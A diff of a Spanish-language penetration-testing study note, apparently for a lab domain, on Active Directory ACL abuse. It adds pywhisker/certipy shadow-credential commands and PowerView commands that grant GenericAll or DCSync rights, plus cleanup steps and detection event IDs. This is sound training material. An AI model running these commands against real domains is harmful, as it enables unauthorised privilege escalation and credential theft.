@@ -47,18 +47,29 @@ Escribes un SPN falso en la cuenta, la kerberoasteas y borras el SPN: <mark styl
 <mark style="background: #ADCCFFA6;">Con `GenericWrite`/`GenericAll` sobre un usuario o equipo, añades una credencial de clave (`msDS-KeyCredentialLink`) y te autenticas por `PKINIT` para obtener su hash NT</mark>. La técnica preferida en 2026 porque <mark style="background: #FF5582A6;">no cambia nada visible para la víctima</mark> (a diferencia de un reset):
 
 ```shell-session
-$ pywhisker -d inlanefreight.local -u me -p pass --target mmorgan --action add
+$ pywhisker -d inlanefreight.local -u me -p pass --target mmorgan --action add --filename mmorgan
 $ certipy auth -pfx mmorgan.pfx -dc-ip 172.16.5.5
 ```
 
-En Windows, `Whisker` hace lo mismo. Requiere que el dominio tenga PKI (ADCS), casi siempre presente.
+En Windows, `Whisker` hace lo mismo. El certificado lo autofirma la propia herramienta; lo que hace falta es que **el DC** tenga un certificado de autenticación de servidor para `PKINIT` (Windows Server 2016+), lo que en la práctica implica un ADCS desplegado — casi siempre presente.
 
 # WriteDACL / WriteOwner — escalar el propio derecho
 
-Con `WriteOwner` te haces dueño del objeto; con `WriteDACL` <mark style="background: #FFB86CA6;">te concedes `GenericAll` — o directamente los derechos de replicación para un [[15 - DCSync]]</mark>.
+Con `WriteOwner` te haces dueño del objeto; con `WriteDACL` <mark style="background: #FFB86CA6;">te concedes `GenericAll` — o directamente los derechos de replicación para un [[15 - DCSync]]</mark>:
+
+```powershell
+# WriteOwner → tomar posesión del objeto (PowerView)
+Set-DomainObjectOwner -Identity <target> -OwnerIdentity <tú>
+
+# WriteDACL → auto-concederte GenericAll, o directamente DCSync sobre el dominio
+Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <tú> -Rights All
+Add-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity <tú> -Rights DCSync
+```
+
+`Add-DomainObjectAcl` acepta atajos de `-Rights`: `All`, `ResetPassword`, `WriteMembers` y `DCSync`.
 
 > [!warning]+ Limpieza obligatoria
-> Todo cambio de ACL/objeto se **revierte**: borra el SPN falso, sácate del grupo, elimina el `KeyCredentialLink`. No hacerlo rompe producción y deja evidencia. Anota cada cambio antes de ejecutarlo.
+> Todo cambio de ACL/objeto se **revierte**: borra el SPN falso, sácate del grupo, elimina el `KeyCredentialLink`, y quita el ACE que te añadiste con `Remove-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <tú> -Rights All`. No hacerlo rompe producción y deja evidencia. Anota cada cambio antes de ejecutarlo.
 
 > [!warning]+ Detección
 > Modificar objetos genera `5136` (objeto modificado), `4738` (cuenta cambiada) y `4728` (miembro añadido a grupo). Un `5136` sobre `msDS-KeyCredentialLink` es firma de *shadow credentials*, y MDI lo marca. Telemetría en [[25 - Detección y evasión en AD]].
